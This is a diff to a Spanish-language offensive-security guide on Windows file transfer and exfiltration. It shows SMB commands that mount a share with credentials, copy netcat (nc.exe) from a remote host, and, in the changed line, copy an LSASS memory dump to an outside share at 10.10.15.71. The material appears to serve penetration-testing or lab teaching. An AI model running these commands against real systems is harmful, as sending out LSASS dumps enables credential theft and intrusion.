@@ -2,7 +2,6 @@
 title: "Transferencia de Archivos en Windows"
 pubDate: '2026-08-26'
 ---
-
 Guía técnica de utilidades nativas de Windows (PowerShell, Certutil, Bitsadmin, SMB, VBScript, WinRM y RDP) para transferencia y exfiltración de archivos.
 
 ---
@@ -97,7 +96,7 @@ copy \\10.10.10.32\share\nc.exe C:\Users\Public\nc.exe
 
 :: Si requiere credenciales: montar unidad de red y copiar
 net use n: \\10.10.10.32\share /user:test test
-copy n:\nc.exe C:\Users\Public\nc.exe
+copy C:\lsass.DMP \\10.10.15.71\share\
 ```
 
 ---
